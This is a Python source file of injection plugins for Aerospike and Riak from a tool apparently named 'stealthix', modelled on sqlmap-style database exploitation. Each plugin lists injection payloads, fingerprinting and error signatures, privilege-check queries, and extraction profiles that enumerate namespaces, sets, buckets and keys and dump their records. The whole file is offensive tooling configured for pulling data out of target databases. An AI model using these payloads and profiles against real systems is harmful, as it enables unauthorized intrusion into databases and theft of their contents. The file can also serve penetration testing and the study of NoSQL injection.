from __future__ import annotations

from stealthix.plugins.base import Plugin

KEYVALUE_PLUGINS = [
    Plugin(
        "aerospike",
        "nosql",
        dbms="aerospike",
        payloads=['field="1"', 'field eq "1"'],
        fingerprints=["aerospike", "aql"],
        error_signatures=["aerospike", "aql", "error"],
        version_queries=["SELECT * FROM system.info()", "SELECT build FROM system.info()"],
        privilege_checks=["SELECT * FROM system.users", "SELECT * FROM system.roles"],
        os_queries=["SELECT * FROM system.info()"],
        preferred_techniques="BET",
        extraction_profiles={
            "databases": {
                "payloads": ["SHOW NAMESPACES", "SELECT * FROM system.namespaces"],
                "patterns": [
                    r"\bnamespace[:=\s]+([a-z0-9_\-]+)",
                    r"\bdatabase[:=\s]+([a-z0-9_\-]+)",
                ],
            },
            "tables": {
                "payloads": ["SHOW SETS", "SELECT * FROM system.sets"],
                "patterns": [r"\bset[:=\s]+([a-z0-9_\-]+)", r"\btable[:=\s]+([a-z0-9_\-]+)"],
            },
            "columns": {
                "payloads": ["SELECT * FROM set LIMIT 1", "SHOW INDEXES"],
                "patterns": [r"\bfield[:=\s]+([a-z0-9_\-]+)", r"\bcolumn[:=\s]+([a-z0-9_\-]+)"],
            },
            "dump": {
                "payloads": ['SELECT * FROM set WHERE field="1"', "SELECT * FROM set"],
            },
            "files": {"disabled": True},
            "os": {"disabled": True},
        },
    ),
    Plugin(
        "riak",
        "nosql",
        dbms="riak",
        payloads=['field="1"', 'field eq "1"'],
        fingerprints=["riak", "riak_kv"],
        error_signatures=["riak", "riak_kv", "error"],
        version_queries=["GET /stats", "GET /buckets"],
        privilege_checks=["GET /stats", "GET /user"],
        os_queries=["GET /stats"],
        preferred_techniques="BET",
        extraction_profiles={
            "databases": {
                "payloads": ["GET /buckets", "LIST BUCKETS"],
                "patterns": [r"\bbucket[:=\s]+([a-z0-9_\-]+)", r"\bdatabase[:=\s]+([a-z0-9_\-]+)"],
            },
            "tables": {
                "payloads": ["GET /buckets", "LIST BUCKETS"],
                "patterns": [r"\bbucket[:=\s]+([a-z0-9_\-]+)", r"\btable[:=\s]+([a-z0-9_\-]+)"],
            },
            "columns": {
                "payloads": ["GET /buckets/bucket/keys", "GET /buckets/bucket"],
                "patterns": [r"\bkey[:=\s]+([a-z0-9_\-:]+)", r"\bcolumn[:=\s]+([a-z0-9_\-]+)"],
            },
            "dump": {
                "payloads": ["GET /buckets/bucket/key", "GET /buckets/bucket/keys"],
            },
            "files": {"disabled": True},
            "os": {"disabled": True},
        },
    ),
]

__all__ = ["KEYVALUE_PLUGINS"]
